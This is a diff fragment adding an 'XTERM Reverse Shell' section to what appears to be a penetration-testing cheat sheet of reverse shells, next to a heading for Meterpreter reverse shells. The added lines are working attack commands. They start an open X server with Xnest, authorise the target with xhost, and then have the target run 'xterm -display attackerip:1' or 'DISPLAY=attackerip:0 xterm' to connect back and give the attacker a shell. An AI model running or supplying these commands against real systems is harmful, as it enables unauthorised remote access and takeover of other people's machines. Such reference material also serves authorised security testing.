@@ -162,6 +162,26 @@ return 0;
 }
 ```
 
+### XTERM Reverse Shell
+
+```bash
+# Start an open X Server on your system (:1 – which listens on TCP port 6001)
+apt-get install xnest
+Xnest :1
+
+# Then remember to authorise on your system the target IP to connect to you
+xterm -display 127.0.0.1:1
+
+# Run this INSIDE the spawned xterm on the open X Server
+xhost +targetip
+
+# Then on the target connect back to the your X Server
+xterm -display attackerip:1
+/usr/openwin/bin/xterm -display attackerip:1
+or
+$ DISPLAY=attackerip:0 xterm
+```
+
 ### **Meterpreter Reverse Shells**
 
 * **Linux Non-Staged reverse TCP**
